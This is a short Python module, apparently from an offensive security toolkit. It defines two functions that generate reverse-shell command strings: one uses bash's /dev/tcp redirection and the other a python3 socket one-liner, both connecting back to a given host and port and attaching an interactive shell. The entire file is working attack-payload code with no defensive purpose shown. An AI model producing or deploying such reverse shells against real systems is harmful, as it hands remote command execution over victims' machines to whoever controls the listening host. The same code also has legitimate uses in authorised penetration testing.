__all__ = ['reverse_bash', 'reverse_python']

import random
from shlex import quote


def reverse_bash(
    lhost: str, lport: int, *, bash_path: str | None = "bash", shell_path="sh"
) -> str:
    """Creates an interactive shell via bash's builtin /dev/tcp"""
    shell_path = shell_path or '/bin/sh'
    fd = random.choice(range(20, 220))
    cmd = ";".join(
        [
            f"0<&{fd}-",
            f"exec {fd}<>/dev/tcp/{lhost}/{lport}",
            f"{shell_path} <&{fd} >&{fd} 2>&{fd}",
        ]
    )
    if bash_path is None:
        return cmd
    bash_path = bash_path or '/bin/bash'
    return f"{bash_path} -c {quote(cmd)}"


def reverse_python(
    lhost: str, lport: int, *, py_path="python3", shell_path="sh"
) -> str:
    """Connect back and create a command shell via Python"""
    py_path = py_path or 'python3'
    shell_path = shell_path or '/bin/sh'
    return "{0} -c {cmd}".format(
        py_path,
        cmd=quote(
            ";".join(
                [
                    "import os,socket,subprocess",
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
                    f's.connect(("{lhost}",{lport}))',
                    "[os.dup2(s.fileno(),h) for h in (0,1,2)]",
                    f'subprocess.call(["{shell_path}","-i"])',
                ]
            )
        ),
    )
